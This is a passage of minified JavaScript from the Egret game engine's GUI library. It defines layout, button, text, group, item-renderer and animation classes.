				else if ("string" == typeof a) {
					var h = new d.URLLoader;
					h.dataFormat = d.URLLoaderDataFormat.TEXTURE;
					h.addEventListener(d.Event.COMPLETE, function (d) {
						f = h.data;
						b.call(c, f, a)
					}, this);
					h.load(new d.URLRequest(a))
				} else
					b.call(c, f, a)
			};
			return c
		}
		();
		e.DefaultAssetAdapter = f;
		f.prototype.__class__ = "egret.gui.DefaultAssetAdapter"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this)
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "target", {
				get : function () {
					return this._target
				},
				set : function (b) {
					this._target = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.measure = function () {
				if (null != this.target) {
					for (var b = 0, a = 0, c = this._target.skin, d = this.target.numChildren, e = 0; e < d; e++) {
						var f = this.target.getChildAt(e);
						if (f && f != c && f.includeInLayout) {
							var l = f.horizontalCenter,
							k = f.verticalCenter,
							n = f.left,
							q = f.right,
							p = f.top,
							r = f.bottom;
							isNaN(n) || isNaN(q) ? isNaN(l) ? isNaN(n) && isNaN(q) ? l = f.preferredX : (l = isNaN(n) ? 0 : n, l += isNaN(q) ? 0 : q) : l = 2 * Math.abs(l) : l = n + q;
							isNaN(p) || isNaN(r) ? isNaN(k) ? isNaN(p) && isNaN(r) ? k = f.preferredY : (k = isNaN(p) ? 0 : p, k += isNaN(r) ? 0 : r) : k = 2 * Math.abs(k) : k = p + r;
							r = f.preferredHeight;
							b = Math.ceil(Math.max(b, l + f.preferredWidth));
							a = Math.ceil(Math.max(a, k + r))
						}
					}
					this.target.measuredWidth = Math.max(b, this.target.measuredWidth);
					this.target.measuredHeight = Math.max(a, this.target.measuredHeight)
				}
			};
			a.prototype.updateDisplayList = function (b,
				a) {
				if (null != this.target)
					for (var c = this.target.numChildren, d = this._target.skin, e = 0; e < c; e++) {
						var f = this.target.getChildAt(e);
						if (null != f && f != d && f.includeInLayout) {
							var l = f.horizontalCenter,
							k = f.verticalCenter,
							n = f.left,
							q = f.right,
							p = f.top,
							r = f.bottom,
							x = f.percentWidth,
							z = f.percentHeight,
							v = NaN,
							A = NaN;
							isNaN(n) || isNaN(q) ? isNaN(x) || (v = Math.round(b * Math.min(0.01 * x, 1))) : v = b - q - n;
							isNaN(p) || isNaN(r) ? isNaN(z) || (A = Math.round(a * Math.min(0.01 * z, 1))) : A = a - r - p;
							f.setLayoutBoundsSize(v, A);
							x = f.layoutBoundsWidth;
							z = f.layoutBoundsHeight;
							A = v = NaN;
							v = isNaN(l) ? isNaN(n) ? isNaN(q) ? f.layoutBoundsX : b - x - q : n : Math.round((b - x) / 2 + l);
							A = isNaN(k) ? isNaN(p) ? isNaN(r) ? f.layoutBoundsY : a - z - r : p : Math.round((a - z) / 2 + k);
							f.setLayoutBoundsPosition(v, A)
						}
					}
			};
			return a
		}
		(d.HashObject);
		e.SkinBasicLayout = f;
		f.prototype.__class__ = "egret.gui.SkinBasicLayout"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._autoRepeat = this._downEventFired = !1;
				this._repeatInterval = this._repeatDelay = 35;
				this._keepDown = this._hovered = !1;
				this._label = "";
				this.touchChildren = this._stickyHighlighting = this._mouseCaptured = !1;
				this.addHandlers()
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "autoRepeat", {
				get : function () {
					return this._autoRepeat
				},
				set : function (b) {
					b != this._autoRepeat && (this._autoRepeat = b, this.checkAutoRepeatTimerConditions(this.isDown()))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "repeatDelay", {
				get : function () {
					return this._repeatDelay
				},
				set : function (b) {
					this._repeatDelay = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "repeatInterval", {
				get : function () {
					return this._repeatInterval
				},
				set : function (b) {
					this._repeatInterval = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "hovered", {
				get : function () {
					return this._hovered
				},
				set : function (b) {
					b != this._hovered && (this._hovered = b, this.invalidateSkinState(),
						this.checkButtonDownConditions())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setKeepDown = function (b) {
				this._keepDown != b && (this._keepDown = b, this.invalidateSkinState())
			};
			Object.defineProperty(a.prototype, "label", {
				get : function () {
					return this._getLabel()
				},
				set : function (b) {
					this._setLabel(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._getLabel = function () {
				return this.labelDisplay ? this.labelDisplay.text : this._label
			};
			a.prototype._setLabel = function (b) {
				this._label = b;
				this.labelDisplay && (this.labelDisplay.text =
						b)
			};
			Object.defineProperty(a.prototype, "mouseCaptured", {
				get : function () {
					return this._mouseCaptured
				},
				set : function (b) {
					b != this._mouseCaptured && (this._mouseCaptured = b, this.invalidateSkinState(), b || this.removeStageMouseHandlers(), this.checkButtonDownConditions())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "stickyHighlighting", {
				get : function () {
					return this._stickyHighlighting
				},
				set : function (b) {
					b != this._stickyHighlighting && (this._stickyHighlighting = b, this.invalidateSkinState(), this.checkButtonDownConditions())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.checkButtonDownConditions = function () {
				var b = this.isDown();
				this._downEventFired != b && (b && e.UIEvent.dispatchUIEvent(this, e.UIEvent.BUTTON_DOWN), this._downEventFired = b, this.checkAutoRepeatTimerConditions(b))
			};
			a.prototype.addHandlers = function () {
				this.addEventListener(d.TouchEvent.TOUCH_ROLL_OVER, this.mouseEventHandler, this);
				this.addEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.mouseEventHandler, this);
				this.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.mouseEventHandler,
					this);
				this.addEventListener(d.TouchEvent.TOUCH_END, this.mouseEventHandler, this);
				this.addEventListener(d.TouchEvent.TOUCH_TAP, this.mouseEventHandler, this)
			};
			a.prototype.addStageMouseHandlers = function () {
				e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this);
				e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this)
			};
			a.prototype.removeStageMouseHandlers = function () {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler,
					this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this)
			};
			a.prototype.isDown = function () {
				return this.enabled ? this.mouseCaptured && (this.hovered || this.stickyHighlighting) ? !0 : !1 : !1
			};
			a.prototype.checkAutoRepeatTimerConditions = function (b) {
				b = this.autoRepeat && b;
				b != (null != this.autoRepeatTimer) && (b ? this.startTimer() : this.stopTimer())
			};
			a.prototype.startTimer = function () {
				this.autoRepeatTimer = new d.Timer(1);
				this.autoRepeatTimer.delay = this._repeatDelay;
				this.autoRepeatTimer.addEventListener(d.TimerEvent.TIMER,
					this.autoRepeat_timerDelayHandler, this);
				this.autoRepeatTimer.start()
			};
			a.prototype.stopTimer = function () {
				this.autoRepeatTimer.stop();
				this.autoRepeatTimer = null
			};
			a.prototype.mouseEventHandler = function (b) {
				switch (b.type) {
				case d.TouchEvent.TOUCH_ROLL_OVER:
					if (b.touchDown && !this.mouseCaptured)
						break;
					this.hovered = !0;
					break;
				case d.TouchEvent.TOUCH_ROLL_OUT:
					this.hovered = !1;
					break;
				case d.TouchEvent.TOUCH_BEGIN:
					this.addStageMouseHandlers();
					d.InteractionMode.mode == d.InteractionMode.TOUCH && (this.hovered = !0);
					this.mouseCaptured =
						!0;
					break;
				case d.TouchEvent.TOUCH_END:
					b.target == this && (this.hovered = !0, this.mouseCaptured && (this.buttonReleased(), this.mouseCaptured = !1));
					break;
				case d.TouchEvent.TOUCH_TAP:
					this.enabled ? this.clickHandler(b) : b.stopImmediatePropagation()
				}
			};
			a.prototype.buttonReleased = function () {};
			a.prototype.clickHandler = function (b) {};
			a.prototype.stage_mouseUpHandler = function (b) {
				b.target != this && (this.mouseCaptured = !1)
			};
			a.prototype.autoRepeat_timerDelayHandler = function (b) {
				this.autoRepeatTimer.reset();
				this.autoRepeatTimer.removeEventListener(d.TimerEvent.TIMER,
					this.autoRepeat_timerDelayHandler, this);
				this.autoRepeatTimer.delay = this._repeatInterval;
				this.autoRepeatTimer.addEventListener(d.TimerEvent.TIMER, this.autoRepeat_timerHandler, this);
				this.autoRepeatTimer.start()
			};
			a.prototype.autoRepeat_timerHandler = function (b) {
				e.UIEvent.dispatchUIEvent(this, e.UIEvent.BUTTON_DOWN)
			};
			a.prototype.getCurrentSkinState = function () {
				return this.enabled ? this.isDown() || this._keepDown ? "down" : d.InteractionMode.mode == d.InteractionMode.MOUSE && (this.hovered || this.mouseCaptured) ? "over" :
				"up" : c.prototype.getCurrentSkinState.call(this)
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.labelDisplay && (this.labelDisplay.text = this._label)
			};
			return a
		}
		(e.SkinnableComponent);
		e.ButtonBase = f;
		f.prototype.__class__ = "egret.gui.ButtonBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._autoSelected = !0
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "selected", {
				get : function () {
					return this._selected
				},
				set : function (b) {
					this._setSelected(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setSelected = function (b) {
				b != this._selected && (this._selected = b, e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT), this.invalidateSkinState())
			};
			a.prototype.getCurrentSkinState = function () {
				return this.selected ? c.prototype.getCurrentSkinState.call(this) +
				"AndSelected" : c.prototype.getCurrentSkinState.call(this)
			};
			a.prototype.buttonReleased = function () {
				c.prototype.buttonReleased.call(this);
				this._autoSelected && this.enabled && (this.selected = !this.selected, this.dispatchEventWith(d.Event.CHANGE))
			};
			return a
		}
		(e.ButtonBase);
		e.ToggleButtonBase = f;
		f.prototype.__class__ = "egret.gui.ToggleButtonBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._fontFamily = "SimSun";
				this._size = 30;
				this._textAlign = d.HorizontalAlign.LEFT;
				this._verticalAlign = d.VerticalAlign.TOP;
				this._lineSpacing = 0;
				this._textColor = 16777215;
				this._text = ""
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "fontFamily", {
				get : function () {
					return this._fontFamily
				},
				set : function (b) {
					this._fontFamily != b && (this._fontFamily = b, this.fontFamilyChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "size", {
				get : function () {
					return this._size
				},
				set : function (b) {
					this._size != b && (this._size = b, this.sizeChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "bold", {
				get : function () {
					return this._bold
				},
				set : function (b) {
					this._bold != b && (this._bold = b, this.boldChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "italic", {
				get : function () {
					return this._italic
				},
				set : function (b) {
					this._italic != b && (this._italic = b, this.italicChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "textAlign", {
				get : function () {
					return this._textAlign
				},
				set : function (b) {
					this._textAlign != b && (this._textAlign = b, this.textAlignChanged = !0, this.invalidateProperties(), this.invalidateSize(),
						this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "verticalAlign", {
				get : function () {
					return this._verticalAlign
				},
				set : function (b) {
					this._verticalAlign != b && (this._verticalAlign = b, this.verticalAlignChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "lineSpacing", {
				get : function () {
					return this._lineSpacing
				},
				set : function (b) {
					this._lineSpacing != b && (this._lineSpacing =
							b, this.lineSpacingChanged = !0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "textColor", {
				get : function () {
					return this._textColor
				},
				set : function (b) {
					this._textColor != b && (this._textColor = b, this.textColorChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "text", {
				get : function () {
					return this._text
				},
				set : function (b) {
					b != this._text && (this._text = b, this._textChanged =
							!0, this.invalidateProperties(), this.invalidateSize(), this.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.createChildren = function () {
				c.prototype.createChildren.call(this);
				this._textField || this.checkTextField()
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this._textField || this.checkTextField();
				this.fontFamilyChanged && (this._textField.fontFamily = this._fontFamily, this.fontFamilyChanged = !1);
				this.sizeChanged && (this._textField.size = this._size, this.sizeChanged =
						!1);
				this.boldChanged && (this._textField.bold = this._bold, this.boldChanged = !1);
				this.italic && (this._textField.italic = this._italic, this.italicChanged = !1);
				this.textAlignChanged && (this._textField.textAlign = this._textAlign, this.textAlignChanged = !1);
				this.verticalAlignChanged && (this._textField.verticalAlign = this._verticalAlign, this.verticalAlignChanged = !1);
				this.lineSpacingChanged && (this._textField.lineSpacing = this._lineSpacing, this.lineSpacingChanged = !1);
				this.textColorChanged && (this._textField.textColor = this._textColor,
					this.textColorChanged = !1);
				this._textChanged && (this._textField.text = this._text, this._textChanged = !1)
			};
			a.prototype.checkTextField = function () {
				this._textField || (this.createTextField(), this._textField.text = this._text, this._textChanged = !0, this.invalidateProperties())
			};
			a.prototype.createTextField = function () {
				this._textField = new d.TextField;
				this._textField.fontFamily = this._fontFamily;
				this._textField.size = this._size;
				this._textField.textAlign = this._textAlign;
				this._textField.verticalAlign = this._verticalAlign;
				this._textField.lineSpacing = this._lineSpacing;
				this._textField.textColor = this._textColor;
				this._addToDisplayList(this._textField)
			};
			a.prototype.measure = function () {
				c.prototype.measure.call(this);
				this.measuredWidth = a.DEFAULT_MEASURED_WIDTH;
				this.measuredHeight = a.DEFAULT_MEASURED_HEIGHT
			};
			a.prototype.$updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a)
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this._textField.width = b;
				this._textField.height =
					a
			};
			a.DEFAULT_MEASURED_WIDTH = 160;
			a.DEFAULT_MEASURED_HEIGHT = 22;
			return a
		}
		(e.UIComponent);
		e.TextBase = f;
		f.prototype.__class__ = "egret.gui.TextBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._contentHeight = this._contentWidth = 0;
				this._clipAndEnableScrolling = !1;
				this._verticalScrollPosition = this._horizontalScrollPosition = 0;
				this.touchEnabled = this._layoutInvalidateSizeFlag = this._layoutInvalidateDisplayListFlag = !1
			}
			__extends(a, c);
			a.prototype.createChildren = function () {
				c.prototype.createChildren.call(this);
				this._layout || (this.layout = new e.BasicLayout)
			};
			Object.defineProperty(a.prototype, "contentWidth", {
				get : function () {
					return this._contentWidth
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setContentWidth = function (b) {
				if (b != this._contentWidth) {
					var a = this._contentWidth;
					this._contentWidth = b;
					this.hasEventListener("propertyChange") && e.PropertyChangeEvent.dispatchPropertyChangeEvent(this, e.PropertyChangeEventKind.UPDATE, "contentWidth", a, b, this)
				}
			};
			Object.defineProperty(a.prototype, "contentHeight", {
				get : function () {
					return this._contentHeight
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setContentHeight = function (b) {
				if (b != this._contentHeight) {
					var a = this._contentHeight;
					this._contentHeight = b;
					this.hasEventListener("propertyChange") && e.PropertyChangeEvent.dispatchPropertyChangeEvent(this, e.PropertyChangeEventKind.UPDATE, "contentHeight", a, b, this)
				}
			};
			a.prototype.setContentSize = function (b, a) {
				if (b != this._contentWidth || a != this._contentHeight)
					this.setContentWidth(b), this.setContentHeight(a)
			};
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this._layout
				},
				set : function (b) {
					this._setLayout(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setLayout = function (b) {
				if (this._layout !=
					b) {
					this._layout && (this._layout.target = null);
					if (this._layout = b)
						this._layout.target = this;
					this.invalidateSize();
					this.invalidateDisplayList();
					this.dispatchEventWith("layoutChanged")
				}
			};
			Object.defineProperty(a.prototype, "clipAndEnableScrolling", {
				get : function () {
					return this._clipAndEnableScrolling
				},
				set : function (b) {
					b != this._clipAndEnableScrolling && (this.scrollRect = (this._clipAndEnableScrolling = b) ? new d.Rectangle(this._horizontalScrollPosition, this._verticalScrollPosition, this.width, this.height) : null)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "horizontalScrollPosition", {
				get : function () {
					return this._horizontalScrollPosition
				},
				set : function (b) {
					if (b != this._horizontalScrollPosition) {
						var a = this._horizontalScrollPosition;
						this._horizontalScrollPosition = b;
						this.scrollPositionChanged();
						e.PropertyChangeEvent.dispatchPropertyChangeEvent(this, e.PropertyChangeEventKind.UPDATE, "horizontalScrollPosition", a, b, this)
					}
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "verticalScrollPosition", {
				get : function () {
					return this._verticalScrollPosition
				},
				set : function (b) {
					if (b != this._verticalScrollPosition) {
						var a = this._verticalScrollPosition;
						this._verticalScrollPosition = b;
						this.scrollPositionChanged();
						e.PropertyChangeEvent.dispatchPropertyChangeEvent(this, e.PropertyChangeEventKind.UPDATE, "verticalScrollPosition", a, b, this)
					}
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.scrollPositionChanged = function () {
				this._clipAndEnableScrolling && (this.updateScrollRect(this.width, this.height), this._invalidateDisplayListExceptLayout(),
					this._layout && this._layout.scrollPositionChanged())
			};
			a.prototype.updateScrollRect = function (b, a) {
				var c = this._scrollRect;
				this._clipAndEnableScrolling ? c ? (c.x = this._horizontalScrollPosition, c.y = this._verticalScrollPosition, c.width = b, c.height = a) : this._scrollRect = new d.Rectangle(this._horizontalScrollPosition, this._verticalScrollPosition, b, a) : c && (this._scrollRect = null)
			};
			a.prototype.measure = function () {
				this._layout && this._layoutInvalidateSizeFlag && (c.prototype.measure.call(this), this._layout.measure())
			};
			a.prototype._invalidateDisplayListExceptLayout = function () {
				c.prototype.invalidateDisplayList.call(this)
			};
			a.prototype.invalidateDisplayList = function () {
				c.prototype.invalidateDisplayList.call(this);
				this._layoutInvalidateDisplayListFlag = !0
			};
			a.prototype._childXYChanged = function () {
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			a.prototype._invalidateSizeExceptLayout = function () {
				c.prototype.invalidateSize.call(this)
			};
			a.prototype.invalidateSize = function () {
				c.prototype.invalidateSize.call(this);
				this._layoutInvalidateSizeFlag =
					!0
			};
			a.prototype.updateDisplayList = function (b, a) {
				c.prototype.updateDisplayList.call(this, b, a);
				this._layoutInvalidateDisplayListFlag && this._layout && (this._layoutInvalidateDisplayListFlag = !1, this._layout.updateDisplayList(b, a), this.updateScrollRect(b, a))
			};
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return -1
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getElementAt = function (b) {
				return null
			};
			a.prototype.getElementIndex = function (b) {
				return -1
			};
			a.prototype.getElementIndicesInView = function () {
				var b =
					[],
				a;
				if (this.scrollRect)
					for (a = 0; a < this.numChildren; a++) {
						var c = this.getChildAt(a);
						if (c) {
							var e = new d.Rectangle;
							e.x = c.layoutBoundsX;
							e.y = c.layoutBoundsY;
							e.width = c.layoutBoundsWidth;
							e.height = c.layoutBoundsHeight;
							this.scrollRect.intersects(e) && b.push(a)
						}
					}
				else
					for (a = 0; a < this.numChildren; a++)
						b.push(a);
				return b
			};
			a.prototype.setVirtualElementIndicesInView = function (b, a) {};
			a.prototype.getVirtualElementAt = function (b) {
				return this.getElementAt(b)
			};
			return a
		}
		(e.UIComponent);
		e.GroupBase = f;
		f.prototype.__class__ = "egret.gui.GroupBase"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._selected = this.dataChangedFlag = !1;
				this._itemIndex = -1;
				this.touchChildren = !0
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "data", {
				get : function () {
					return this._data
				},
				set : function (b) {
					this._data = b;
					this.initialized || this.parent ? (this.dataChangedFlag = !1, this.dataChanged()) : (this.dataChangedFlag = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.dataChanged = function () {};
			Object.defineProperty(a.prototype,
				"selected", {
				get : function () {
					return this._selected
				},
				set : function (b) {
					this._selected != b && (this._selected = b, this.invalidateSkinState())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemIndex", {
				get : function () {
					return this._itemIndex
				},
				set : function (b) {
					this._itemIndex = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.dataChangedFlag && (this.dataChangedFlag = !1, this.dataChanged())
			};
			a.prototype.getCurrentSkinState = function () {
				return this._selected ?
				"down" : c.prototype.getCurrentSkinState.call(this)
			};
			return a
		}
		(d.ButtonBase);
		d.ItemRenderer = f;
		f.prototype.__class__ = "egret.gui.ItemRenderer"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._indentation = 17;
				this._depth = 0;
				this._isOpen = this._hasChildren = !1;
				this.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.onItemMouseDown, this, !1, 1E3)
			}
			__extends(a, c);
			a.prototype.onItemMouseDown = function (b) {
				b.target == this.disclosureButton && b.stopImmediatePropagation()
			};
			Object.defineProperty(a.prototype, "indentation", {
				get : function () {
					return this._indentation
				},
				set : function (b) {
					this._indentation = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"iconSkinName", {
				get : function () {
					return this._iconSkinName
				},
				set : function (b) {
					this._iconSkinName != b && (this._iconSkinName = b, this.iconDisplay && (this.iconDisplay.source = this._iconSkinName))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "depth", {
				get : function () {
					return this._depth
				},
				set : function (b) {
					b != this._depth && (this._depth = b, this.contentGroup && (this.contentGroup.x = this._depth * this._indentation))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "hasChildren", {
				get : function () {
					return this._hasChildren
				},
				set : function (b) {
					this._hasChildren != b && (this._hasChildren = b, this.disclosureButton && (this.disclosureButton.visible = this._hasChildren))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "opened", {
				get : function () {
					return this._isOpen
				},
				set : function (b) {
					this._isOpen != b && (this._isOpen = b, this.disclosureButton && (this.disclosureButton.selected = this._isOpen))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.iconDisplay ? this.iconDisplay.source =
					this._iconSkinName : a == this.disclosureButton ? (this.disclosureButton.visible = this._hasChildren, this.disclosureButton.selected = this._isOpen, this.disclosureButton._autoSelected = !1, this.disclosureButton.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.disclosureButton_mouseDownHandler, this)) : a == this.contentGroup && (this.contentGroup.x = this._depth * this._indentation)
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this, b, a);
				a == this.iconDisplay ? this.iconDisplay.source = null : a == this.disclosureButton &&
					(this.disclosureButton.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.disclosureButton_mouseDownHandler, this), this.disclosureButton._autoSelected = !0, this.disclosureButton.visible = !0)
			};
			a.prototype.disclosureButton_mouseDownHandler = function (b) {
				e.TreeEvent.dispatchTreeEvent(this, e.TreeEvent.ITEM_OPENING, this.itemIndex, this.data, this, !this._isOpen)
			};
			return a
		}
		(e.ItemRenderer);
		e.TreeItemRenderer = f;
		f.prototype.__class__ = "egret.gui.TreeItemRenderer"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = function () {
			function c(a, b) {
				this.easerFunction = d.Ease.sineInOut;
				this._duration = 500;
				this._startDelay = 0;
				this._repeatCount = 1;
				this._repeatDelay = 0;
				this.motionPaths = [];
				this._currentValue = {};
				this.pauseTime = 0;
				this._isPaused = !1;
				this.startTime = 0;
				this._started = !1;
				this.playedTimes = 0;
				this.updateFunction = a;
				this.thisObject = b
			}
			Object.defineProperty(c.prototype, "isPlaying", {
				get : function () {
					return this._isPlaying
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "duration", {
				get : function () {
					return this._duration
				},
				set : function (a) {
					this._duration = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "startDelay", {
				get : function () {
					return this._startDelay
				},
				set : function (a) {
					this._startDelay = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "repeatCount", {
				get : function () {
					return this._repeatCount
				},
				set : function (a) {
					this._repeatCount = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "repeatDelay", {
				get : function () {
					return this._repeatDelay
				},
				set : function (a) {
					this._repeatDelay = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "currentValue", {
				get : function () {
					return this._currentValue
				},
				enumerable : !0,
				configurable : !0
			});
			c.prototype.play = function () {
				this.stopAnimation();
				this.start()
			};
			c.prototype.seek = function (a) {
				a = Math.min(a, this.duration);
				this.caculateCurrentValue(a / this.duration);
				this.startTime = d.getTimer() - a - this._startDelay;
				null != this.updateFunction && this.updateFunction.call(this.thisObject, this)
			};
			c.prototype.start = function () {
				this.playedTimes =
					0;
				this._started = !0;
				this._isPlaying = !1;
				this._currentValue = {};
				this.caculateCurrentValue(0);
				this.startTime = d.getTimer();
				c.currentTime = this.startTime;
				this.doInterval();
				c.addAnimation(this)
			};
			c.prototype.end = function () {
				this._started || (this.caculateCurrentValue(0), null != this.startFunction && this.startFunction.call(this.thisObject, this), null != this.updateFunction && this.updateFunction.call(this.thisObject, this));
				this.caculateCurrentValue(1);
				null != this.updateFunction && this.updateFunction.call(this.thisObject,
					this);
				this.stopAnimation();
				null != this.endFunction && this.endFunction.call(this.thisObject, this)
			};
			c.prototype.stop = function () {
				this.stopAnimation();
				null != this.stopFunction && this.stopFunction.call(this.thisObject, this)
			};
			c.prototype.stopAnimation = function () {
				this.playedTimes = 0;
				this._isPlaying = !1;
				this.startTime = 0;
				this._started = !1;
				c.removeAnimation(this)
			};
			Object.defineProperty(c.prototype, "isPaused", {
				get : function () {
					return this._isPaused
				},
				enumerable : !0,
				configurable : !0
			});
			c.prototype.pause = function () {
				this._started &&
				(this._isPaused = !0, this.pauseTime = d.getTimer(), this._isPlaying = !1, c.removeAnimation(this))
			};
			c.prototype.resume = function () {
				this._started && this._isPaused && (this._isPaused = !1, this.startTime += d.getTimer() - this.pauseTime, this.pauseTime = -1, c.addAnimation(this))
			};
			Object.defineProperty(c.prototype, "started", {
				get : function () {
					return this._started
				},
				enumerable : !0,
				configurable : !0
			});
			c.prototype.doInterval = function () {
				var a = c.currentTime - this.startTime - (0 < this.playedTimes ? this._repeatDelay : this._startDelay);
				if (0 >
					a)
					return !1;
				this._isPlaying || (this._isPlaying = !0, 0 == this.playedTimes && null != this.startFunction && this.startFunction.call(this.thisObject, this));
				var b = 0 == this._duration ? 1 : Math.min(a, this._duration) / this._duration;
